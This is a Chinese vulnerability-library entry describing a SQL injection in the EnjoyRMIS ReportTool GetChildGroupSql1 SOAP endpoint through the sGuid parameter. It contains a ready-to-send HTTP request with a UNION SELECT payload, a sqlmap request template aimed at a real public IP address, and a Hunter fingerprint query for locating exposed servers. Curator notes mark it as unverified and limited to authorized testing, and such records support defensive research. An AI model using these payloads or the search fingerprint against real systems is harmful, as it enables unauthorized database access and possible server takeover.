---
source: "wy876 漏洞文库"
title: "昂捷EnjoyRMIS ReportTool cwsqry GetChildGroupSql1 sGuid SQL注入"
product: "昂捷EnjoyRMIS"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "SQL Server，固定多列UNION；版本未知"
prerequisites: "无会话/凭据示例，真实鉴权待核"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/gw589s9zgn0o9yrq"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E6%98%82%E6%8D%B7/EnjoyRMISGetChildGroupSql1%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa_unverified: "web.body="
hunter: "web.body=\"CheckSilverlightInstalled\""
id: "vw-09817aeb67feae8b95616ccc"
entity_id: "ve-09817aeb67feae8b95616ccc"
schema_version: "1"
---

# 昂捷EnjoyRMIS ReportTool cwsqry GetChildGroupSql1 sGuid SQL注入

## 条目说明

- 对象与具体问题：昂捷EnjoyRMIS；ReportTool cwsqry GetChildGroupSql1 sGuid SQL注入
- 版本、配置及部署条件：SQL Server，固定多列UNION；版本未知
- 认证与权限前提：无会话/凭据示例，真实鉴权待核
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- Content-Length为字面length非法，必须重算不能照发
- 基准包含真实公网IP，需替换；查询返回列数是环境条件
- 无@@version响应、根因/修复，控制服务器仅可能后果需DB权限
- 与POS cwsoa方法组不同服务文件，保留独立方法和参数名sGuid

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
EnjoyRMIS GetChildGroupSql1存在SQL注入漏洞,攻击者可通过该漏洞获取数据库敏感信息甚至可控制服务器。

## 二、影响版本
+ EnjoyRMIS

## 三、资产测绘
+ hunter`web.body="CheckSilverlightInstalled"`
+ 特征


## 四、漏洞复现
```http
POST /EnjoyRMIS_WS/WS/ReportTool/cwsqry.asmx HTTP/1.1
Host: xx.xx.xx.xx
Content-Type: text/xml; charset=utf-8
SOAPAction: "http://tempuri.org/GetChildGroupSql1"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetChildGroupSql1 xmlns="http://tempuri.org/">
      <sGuid>1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,(select @@version),NULL,NULL-- jhpF</sGuid>
    </GetChildGroupSql1>
  </soap:Body>
</soap:Envelope>
```

> 请求长度说明：原资料 Content-Length 为 length；静态长度已移除，应由客户端根据最终请求体的字节数生成。


sqlmap

```http
POST /EnjoyRMIS_WS/WS/ReportTool/cwsqry.asmx HTTP/1.1
Host: 120.78.175.218:8008
Content-Type: text/xml; charset=utf-8
SOAPAction: "http://tempuri.org/GetChildGroupSql1"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetChildGroupSql1 xmlns="http://tempuri.org/">
      <sGuid>1</sGuid>
    </GetChildGroupSql1>
  </soap:Body>
</soap:Envelope>
```

> 请求长度说明：原资料 Content-Length 为 length；静态长度已移除，应由客户端根据最终请求体的字节数生成。


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/gw589s9zgn0o9yrq>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
